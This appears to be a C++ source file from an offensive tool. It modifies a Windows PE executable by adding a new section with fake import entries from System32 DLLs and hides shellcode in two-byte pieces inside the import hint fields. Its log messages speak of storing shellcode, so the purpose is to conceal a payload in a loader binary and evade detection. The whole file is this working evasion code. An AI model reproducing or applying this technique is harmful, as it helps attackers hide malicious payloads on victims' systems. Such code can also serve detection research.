#include <Windows.h>
#include <iostream>
#include <cmath>
#include <set>
#include "DllNamesForFakeImports.h"
#include "Utils.h"
#include "Structs.h"

#define P2ALIGNUP(size, align) ((((size) / (align)) + 1) * (align))
FAKEIMPORT* fakeImportList = NULL;
int numberOfRequiredDLLs = 0;

// Function for translation of RVA to file offset
DWORD Rva2Offset(DWORD dwRva, PBYTE uiBaseAddress) {
	WORD wIndex = 0;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	PIMAGE_NT_HEADERS pNtHeaders = NULL;

	pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

	pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);

	if (dwRva < pSectionHeader[0].PointerToRawData)
		return dwRva;

	for (wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++)
	{
		if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
			return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
	}

	return 0;
}

int CalculateNumberOfFakeEntries(int numberOfChunks,FAKEIMPORT* fakeImportList) {
	int returnValue = 0;
	char dllPath[MAX_PATH] = { 0x00 };
	uint64_t dllSize = 0;
	for (int i = 0; i < numberOfDllNames; i++) {
		if (numberOfChunks <= 0) {
			break;
		}
		memset(dllPath, 0x00, MAX_PATH);
		sprintf_s(dllPath, "C:\\Windows\\System32\\%s", dllNames[i]);
		PBYTE dllBuffer = ReadFileFromDisk(dllPath, dllSize);
		if (dllBuffer == NULL || dllSize == 0) {
			// TODO: fix missing dll
			std::cout << "[!] Error on dll read: " << dllPath<<std::endl;
			std::cout << "[!] Remove it from the dllNames array !" << std::endl;
			return 0;
		}
		PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBuffer;
		PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)(dllBuffer + dosHeader->e_lfanew);
		PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dllBuffer + Rva2Offset(imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress, dllBuffer));
		DWORD numberOfNames = imageExportDirectory->NumberOfNames;
		returnValue++;
		fakeImportList[i].name = dllNames[i];
		fakeImportList[i].numberOfImports = (numberOfChunks > numberOfNames) ? numberOfNames : numberOfChunks;
		fakeImportList[i].offsetArray = (PBYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fakeImportList[i].numberOfImports*sizeof(PBYTE *));
		if (fakeImportList[i].offsetArray == NULL) {
			std::cout << "[!] Error on heap allocation !" << std::endl;
			return 0;
		}
		numberOfChunks -= numberOfNames;
	}
	if (numberOfChunks > 0) {
		std::cout << "[!] Shellcode size is bigger than the exports of dlls in the dllNames array !" << std::endl;
		std::cout << "[!] Add new dll names to the dllNames array !" << std::endl;
		return 0;
	}
	return returnValue;
}

LPCSTR* GetImportNamesFromIndex(PBYTE dllBuffer, int* selectedIndexes, int indexArraySize) {
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBuffer;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)(dllBuffer + dosHeader->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dllBuffer + Rva2Offset(imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress, dllBuffer));
	PDWORD nameArray = (PDWORD)(dllBuffer + Rva2Offset(imageExportDirectory->AddressOfNames,dllBuffer));
	LPCSTR *returnArrayAddr = (LPCSTR *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, indexArraySize * sizeof(LPCSTR));
	if (returnArrayAddr == NULL) {
		std::cout << "[!] Error on heap allocation !" << std::endl;
		return NULL;
	}
	PCHAR tmpNamePtr = NULL;
	int selectedIndex = 0;
	DWORD rvaOfName = 0;
	for (int i = 0; i < indexArraySize; i++) {
		selectedIndex = selectedIndexes[i];
		rvaOfName = nameArray[selectedIndex];
		tmpNamePtr = (PCHAR)(dllBuffer + Rva2Offset(rvaOfName, dllBuffer));
		returnArrayAddr[i] = (LPCSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, strlen(tmpNamePtr)+1);
		if (returnArrayAddr[i] == NULL) {
			std::cout << "[!] Error on heap allocation !" << std::endl;
			return NULL;
		}
		memset((void *) returnArrayAddr[i], 0x00, strlen(tmpNamePtr) + 1);
		memcpy((void*) returnArrayAddr[i], tmpNamePtr, strlen(tmpNamePtr));
	}
	return returnArrayAddr;
}

LPCSTR* SelectDLLEntries(LPCSTR dllName, uint64_t numberOfDesiredFunctions) {
	char dllPath[MAX_PATH] = { 0x00 };
	uint64_t dllSize = 0;
	sprintf_s(dllPath, "C:\\Windows\\System32\\%s", dllName);
	PBYTE dllBuffer = ReadFileFromDisk(dllPath, dllSize);
	if (dllBuffer == NULL || dllSize == 0) {
		std::cout << "[!] Error on dll read" << std::endl;
		return NULL;
	}
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBuffer;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)(dllBuffer + dosHeader->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dllBuffer + Rva2Offset(imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress,dllBuffer));
	DWORD numberOfNames = imageExportDirectory->NumberOfNames;
	PDWORD nameArray = (PDWORD)(dllBuffer + imageExportDirectory->AddressOfNames);
	int *selectedIndexes = (int *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, numberOfDesiredFunctions *sizeof(int));
	if (selectedIndexes == NULL) {
		std::cout << "[!] Error on heap allocation !" << std::endl;
		return NULL;
	}
	std::set<int> indexes;
	while (indexes.size() < numberOfDesiredFunctions) {
		indexes.insert(GetRandomNumber(0,numberOfNames-1));
	}
	int indexCounter = 0;
	for (std::set<int>::iterator it = indexes.begin(); it != indexes.end(); ++it,indexCounter++) {
		selectedIndexes[indexCounter] = *it; // Note the "*" here
	}
	LPCSTR* returnValue = GetImportNamesFromIndex(dllBuffer,selectedIndexes,numberOfDesiredFunctions);
	HeapFree(GetProcessHeap(), 0, selectedIndexes);
	HeapFree(GetProcessHeap(), 0, dllBuffer);
	return returnValue;
}

PBYTE AddNewSection(PBYTE oldFileBuffer, uint64_t oldFileSize, uint64_t numberOfChunks, uint64_t& newFileSize) {
	PIMAGE_DOS_HEADER imageDosHeader;
	PIMAGE_NT_HEADERS imageNtHeader;
	PIMAGE_NT_HEADERS newImageNtHeader;
	IMAGE_NT_HEADERS backupNtHeader;
	DWORD dwExistingImportDescriptorEntryCount;
	DWORD dwNewImportDescriptorEntryCount;
	PIMAGE_IMPORT_DESCRIPTOR existingImportDescriptorAddr;
	PIMAGE_SECTION_HEADER sectionHeaderArray;
	PIMAGE_SECTION_HEADER newSectionHeaderArray;
	PBYTE newFileBuffer = NULL;
	uint64_t functionStringLengths = 0;
	uint64_t dllNamesSize = 0;
	fakeImportList = (FAKEIMPORT*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, numberOfDllNames*sizeof(FAKEIMPORT));
	if (fakeImportList == NULL) {
		std::cout << "[!] Error on Heap Allocation !" << std::endl;
		return NULL;
	}
	imageDosHeader = (PIMAGE_DOS_HEADER)oldFileBuffer;
	imageNtHeader = (PIMAGE_NT_HEADERS)(oldFileBuffer + imageDosHeader->e_lfanew);
	sectionHeaderArray = (PIMAGE_SECTION_HEADER)(((PBYTE)imageNtHeader) + sizeof(IMAGE_NT_HEADERS));
	// calculate existing number of imported dll modules
	dwExistingImportDescriptorEntryCount = imageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size / sizeof(IMAGE_IMPORT_DESCRIPTOR);
	// Actually on my computer, loader binary has one import.
	numberOfRequiredDLLs = CalculateNumberOfFakeEntries(numberOfChunks,fakeImportList);
	if (numberOfRequiredDLLs == 0) {
		return NULL;
	}
	std::cout << "[+] Number of DLL for storing shellcode is: " << numberOfRequiredDLLs << std::endl;
	if (dwExistingImportDescriptorEntryCount == 0){
		// the target process doesn't have any imported dll entries, 1 for last entry which is 0 and fakes
		dwNewImportDescriptorEntryCount = numberOfRequiredDLLs +1;
	}
	else{
		// add fake entries
		dwNewImportDescriptorEntryCount = dwExistingImportDescriptorEntryCount + numberOfRequiredDLLs;
	}
	// Select names from the DLLs
	for (int i = 0; i < numberOfRequiredDLLs; i++) {
		fakeImportList[i].nameofImports = SelectDLLEntries(fakeImportList[i].name, fakeImportList[i].numberOfImports);
		if (fakeImportList[i].nameofImports == NULL) {
			std::cout << "[!] Error on reading DLL imports " << fakeImportList[i].name << std::endl;
			return NULL;
		}
	}
	// Calculate the length of import function names
	for (int i = 0; i < numberOfRequiredDLLs; i++) {
		for (int j = 0; j < fakeImportList[i].numberOfImports; j++) {
			functionStringLengths += strlen(fakeImportList[i].nameofImports[j]);
			functionStringLengths++;
		}
	}
	// Calculate the length of dll names
	for (int i = 0; i < numberOfRequiredDLLs; i++) {
		dllNamesSize = dllNamesSize + strlen(fakeImportList[i].name) + 1;
	}
	// Region for DLL Names + RVAs for Strings + ILT and IAT --> 2* NumberOfChunks+1 (+1 means null entry) * sizeof THUNK + Import Directory entries
	uint64_t totalLengthForSection = dllNamesSize + functionStringLengths + sizeof(WORD) * numberOfChunks + 2 * (numberOfChunks + 1*numberOfRequiredDLLs) * sizeof(IMAGE_THUNK_DATA) + dwNewImportDescriptorEntryCount * sizeof(IMAGE_IMPORT_DESCRIPTOR);
	int numberOfSections = imageNtHeader->FileHeader.NumberOfSections;
	uint64_t newSectionOffset = sectionHeaderArray[numberOfSections - 1].PointerToRawData + sectionHeaderArray[numberOfSections - 1].SizeOfRawData;
	//Area after the last element in the section header array
	PIMAGE_SECTION_HEADER newSectionHeader = &sectionHeaderArray[numberOfSections];
	bool checkBoundary = ((PBYTE)newSectionHeader + sizeof(IMAGE_SECTION_HEADER) - oldFileBuffer) < sectionHeaderArray[0].PointerToRawData;
	if (checkBoundary) {
		memcpy(newSectionHeader->Name, ".rrdata", IMAGE_SIZEOF_SHORT_NAME);
		newSectionHeader->VirtualAddress = P2ALIGNUP(
			sectionHeaderArray[numberOfSections - 1].VirtualAddress + sectionHeaderArray[numberOfSections - 1].Misc.VirtualSize,
			imageNtHeader->OptionalHeader.SectionAlignment
		);
		//File alignment for PE File, same alignment problem but this is for disk
		newSectionHeader->SizeOfRawData = P2ALIGNUP(totalLengthForSection, imageNtHeader->OptionalHeader.FileAlignment);
		//Section alignment for memory
		newSectionHeader->Misc.VirtualSize = P2ALIGNUP((totalLengthForSection), imageNtHeader->OptionalHeader.SectionAlignment);
		newSectionHeader->Characteristics = 0xC0000040;
		//Offset for file
		newSectionHeader->PointerToRawData = newSectionOffset;
		// Section Alignment trick and put correct address wrt last section
		imageNtHeader->FileHeader.NumberOfSections += 1;
		//Now it has new section size
		newFileSize = P2ALIGNUP(totalLengthForSection, imageNtHeader->OptionalHeader.FileAlignment) + newSectionOffset;
		//New Section Offset is actually end of the file
		newFileBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, newFileSize);
		if (!newFileBuffer) {
			std::cout << ("[!] Failed to allocate new memory for the new file\n");
			return NULL;
		}
		// Copy until end of the NT Headers
		memcpy(newFileBuffer, oldFileBuffer, newSectionOffset);
		newImageNtHeader = (PIMAGE_NT_HEADERS)(newFileBuffer + imageDosHeader->e_lfanew);
		newSectionHeaderArray = (PIMAGE_SECTION_HEADER)(((PBYTE)newImageNtHeader) + sizeof(IMAGE_NT_HEADERS));
		newImageNtHeader->OptionalHeader.SizeOfImage =
			newSectionHeaderArray[newImageNtHeader->FileHeader.NumberOfSections - 1].VirtualAddress +
			newSectionHeaderArray[newImageNtHeader->FileHeader.NumberOfSections - 1].Misc.VirtualSize;
	}
	else {
		std::cout << "[!] No room left for new section header array !" << std::endl;
	}
	return newFileBuffer;
}


bool AddNewImportEntry(PBYTE fileBuffer,PWORD hintArray,uint64_t numberOfChunks) {
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBuffer;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(fileBuffer + dosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER sectionHeaderArray = (PIMAGE_SECTION_HEADER)(((PBYTE)ntHeaders) + sizeof(IMAGE_NT_HEADERS));
	// Address of the beginning of the function
	PBYTE sectionStart = fileBuffer + sectionHeaderArray[ntHeaders->FileHeader.NumberOfSections - 1].PointerToRawData;
	// Import Lookup Table Entries
	PIMAGE_THUNK_DATA importLookupTableTemp;
	PIMAGE_IMPORT_DESCRIPTOR newDllImportDescriptors = (PIMAGE_IMPORT_DESCRIPTOR) HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,sizeof(IMAGE_IMPORT_DESCRIPTOR)*(numberOfRequiredDLLs+1));
	PIMAGE_IMPORT_DESCRIPTOR oldDirectory = (PIMAGE_IMPORT_DESCRIPTOR)(fileBuffer + Rva2Offset(ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress, fileBuffer));
	DWORD dwExistingImportDescriptorEntryCount = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size / sizeof(IMAGE_IMPORT_DESCRIPTOR);
	DWORD dwNewImportDescriptorEntryCount = 0;
	uint64_t functionStringLengths = 0;
	uint64_t dllNamesSize = 0;
	uint64_t offsetCursor = 0;
	uint64_t chunkIndex = 0;
	uint64_t cursorOffsetForILT = 0;
	if (newDllImportDescriptors == NULL) {
		std::cout << "[!] Error on Heap Allocation !" << std::endl;
		return false;
	}
	// Calculate the total length of function strings
	for (int i = 0; i < numberOfRequiredDLLs; i++) {
		for (int j = 0; j < fakeImportList[i].numberOfImports; j++) {
			functionStringLengths += strlen(fakeImportList[i].nameofImports[j]);
			functionStringLengths++;
		}
	}
	// Calculate the length of dll names
	for (int i = 0; i < numberOfRequiredDLLs; i++) {
		dllNamesSize = dllNamesSize + strlen(fakeImportList[i].name) + 1;
	}
	
	if (dwExistingImportDescriptorEntryCount == 0)
	{
		// the target process doesn't have any imported dll entries - 1 for last and 1 for new
		dwNewImportDescriptorEntryCount = numberOfRequiredDLLs + 1;
	}
	else
	{
		// add one extra dll entry
		dwNewImportDescriptorEntryCount = dwExistingImportDescriptorEntryCount + numberOfRequiredDLLs;
	}
	// Size of new Import Directory
	DWORD dwNewImportDescriptorListDataLength = dwNewImportDescriptorEntryCount * sizeof(IMAGE_IMPORT_DESCRIPTOR);
	// Section address after the directory - From that address we put function names and dll names
	PBYTE freeMemoryStartAfterDir = sectionStart + dwNewImportDescriptorListDataLength;
	// Section address after the function names - From that address we put dll names
	PBYTE freeMemoryStartAfterFunctionNames = freeMemoryStartAfterDir + dllNamesSize + functionStringLengths  + sizeof(WORD) * numberOfChunks;
	memset(freeMemoryStartAfterDir, 0x00, dllNamesSize + functionStringLengths + sizeof(WORD) * numberOfChunks);
	for (int i = 0; i < numberOfRequiredDLLs; i++) {
		memcpy(freeMemoryStartAfterDir+offsetCursor, fakeImportList[i].name, strlen(fakeImportList[i].name));
		fakeImportList[i].nameAddr = freeMemoryStartAfterDir + offsetCursor;
		offsetCursor = offsetCursor + strlen(fakeImportList[i].name) + 1;
	}
	
	// Put shellcode chunks after the dll names
	PIMAGE_IMPORT_BY_NAME hintNameEntries = (PIMAGE_IMPORT_BY_NAME)(freeMemoryStartAfterDir + dllNamesSize); 
	offsetCursor = 0;
	for (int i = 0; i < numberOfRequiredDLLs; i++) {
		for (int j = 0; j < fakeImportList[i].numberOfImports; j++) {
			memcpy(&(hintNameEntries->Hint), &hintArray[chunkIndex++], sizeof(WORD));
			memcpy(&(hintNameEntries->Name), fakeImportList[i].nameofImports[j], strlen(fakeImportList[i].nameofImports[j]));
			// Save the hint/name table entries address for saving
			fakeImportList[i].offsetArray[j] = (PBYTE ) (&(hintNameEntries->Hint));
			hintNameEntries = (PIMAGE_IMPORT_BY_NAME)(((PBYTE)hintNameEntries) + sizeof(WORD) + strlen(fakeImportList[i].nameofImports[j]) + 1);
		}
	}
	
	// Put the old directory
	memcpy(sectionStart, oldDirectory, ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size);

	PBYTE thunkAddress = freeMemoryStartAfterDir + dllNamesSize;
	DWORD sectionStartOffset = sectionHeaderArray[ntHeaders->FileHeader.NumberOfSections - 1].PointerToRawData;
	DWORD sectionRVA = sectionHeaderArray[ntHeaders->FileHeader.NumberOfSections - 1].VirtualAddress;
	// True
	// set import lookup table and import address table values

	for (int i = 0; i < numberOfRequiredDLLs; i++) {
		importLookupTableTemp = (PIMAGE_THUNK_DATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IMAGE_THUNK_DATA) * (fakeImportList[i].numberOfImports + 1));
		if (importLookupTableTemp == NULL) {
			std::cout << "[!] Error on Heap Allocation !" << std::endl;
			return false;
		}
		importLookupTableTemp[fakeImportList[i].numberOfImports].u1.AddressOfData = 0;
		// RVA Calculation is section rva + raw offset from the raw offset of the section
		importLookupTableTemp[0].u1.AddressOfData = (sectionRVA + (fakeImportList[i].offsetArray[0] - fileBuffer) - sectionStartOffset);
		for (int j = 1; j < fakeImportList[i].numberOfImports; j++) {
			importLookupTableTemp[j].u1.AddressOfData = (DWORD)(sectionRVA  + (fakeImportList[i].offsetArray[j] - fileBuffer) - sectionStartOffset);
		}
		// Copy ILT of ith fake dll entry
		memcpy(freeMemoryStartAfterFunctionNames+cursorOffsetForILT, importLookupTableTemp, sizeof(IMAGE_THUNK_DATA) * (fakeImportList[i].numberOfImports + 1));
		fakeImportList[i].originalFirstThunkAddr = freeMemoryStartAfterFunctionNames + cursorOffsetForILT;
		cursorOffsetForILT = cursorOffsetForILT + sizeof(IMAGE_THUNK_DATA) * (fakeImportList[i].numberOfImports + 1);
		// Copy IAT of ith fake dll entry
		memcpy(freeMemoryStartAfterFunctionNames + cursorOffsetForILT, importLookupTableTemp, sizeof(IMAGE_THUNK_DATA) * (fakeImportList[i].numberOfImports + 1));
		fakeImportList[i].firstThunkAddr = freeMemoryStartAfterFunctionNames + cursorOffsetForILT;
		cursorOffsetForILT = cursorOffsetForILT + sizeof(IMAGE_THUNK_DATA) * (fakeImportList[i].numberOfImports + 1);
		HeapFree(GetProcessHeap(), 0, importLookupTableTemp);
	}

	
	// We need one for Import Lookup Table, one for Import Address Table - OriginalFirstThunk and FirstThunk
	for (int i = 0; i < numberOfRequiredDLLs; i++) {
		newDllImportDescriptors[i].OriginalFirstThunk = (DWORD)(fakeImportList[i].originalFirstThunkAddr - fileBuffer - sectionStartOffset + sectionRVA);
		newDllImportDescriptors[i].TimeDateStamp = 0;
		newDllImportDescriptors[i].ForwarderChain = 0;
		newDllImportDescriptors[i].Name = (DWORD)(fakeImportList[i].nameAddr - fileBuffer - sectionStartOffset + sectionRVA);
		newDllImportDescriptors[i].FirstThunk = (DWORD)(fakeImportList[i].firstThunkAddr - fileBuffer - sectionStartOffset + sectionRVA );
	}
	
	// end of import descriptor chain
	newDllImportDescriptors[numberOfRequiredDLLs].OriginalFirstThunk = 0;
	newDllImportDescriptors[numberOfRequiredDLLs].TimeDateStamp = 0;
	newDllImportDescriptors[numberOfRequiredDLLs].ForwarderChain = 0;
	newDllImportDescriptors[numberOfRequiredDLLs].Name = 0;
	newDllImportDescriptors[numberOfRequiredDLLs].FirstThunk = 0;

	// TODO: Debug this value it may not be true
	memcpy(sectionStart + dwNewImportDescriptorListDataLength - sizeof(IMAGE_IMPORT_DESCRIPTOR) * (numberOfRequiredDLLs + 1), newDllImportDescriptors, sizeof(IMAGE_IMPORT_DESCRIPTOR)* (numberOfRequiredDLLs + 1));
	ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = sectionHeaderArray[ntHeaders->FileHeader.NumberOfSections - 1].VirtualAddress;
	ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size = dwNewImportDescriptorListDataLength;
	return true;
}
